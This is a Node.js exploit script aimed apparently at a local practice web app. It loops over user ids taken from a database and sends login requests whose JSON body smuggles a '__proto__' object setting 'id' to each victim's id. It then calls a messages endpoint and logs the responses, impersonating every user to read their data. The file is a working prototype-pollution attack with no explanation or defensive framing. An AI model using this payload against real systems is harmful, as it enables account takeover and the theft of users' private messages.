const db = require('./db');
const async = require('async');
const request = require('request');

var headers = {
  'Content-type': 'application/json'
};

var idb = db.get('users').value().map(function(user) {
  return user.id;
});


function requestPromise(options) {
  return new Promise(function(resolve, reject) {
    request(options, function(error, response, body) {
      if(error) {
        return reject(error);
      }
      resolve(body);
    });
  });
}


async function delayedLog(postOptions, getOptions) {
  // waiting until return promise

  var requestPromisePost = await requestPromise(postOptions);
    
  var requestPromiseGet = await requestPromise(getOptions);

  //only print result after implement promise function
  Promise.all([
    requestPromisePost,
    requestPromiseGet
  ])
  .then(function(results) {
    console.log(results);
  })
  .catch(function(err) {
    console.log(err);
  });

}


async function process(array) {
  for(var value of array) {
    var dataString = '{"email": "len1234@gmail.com", "password": "123456", "__proto__": {"id":' + '\"' + value + '\"' + '}}';

    var postOptions = {
      method: 'POST',
      url: 'http://localhost:3333/auth/login',
      headers: headers,
      body: dataString
    };

    var getOptions = {
      method: 'GET',
      url: 'http://localhost:3333/users/getMessage',
      headers: headers
    };
    await delayedLog(postOptions, getOptions);
  }
}

process(idb);
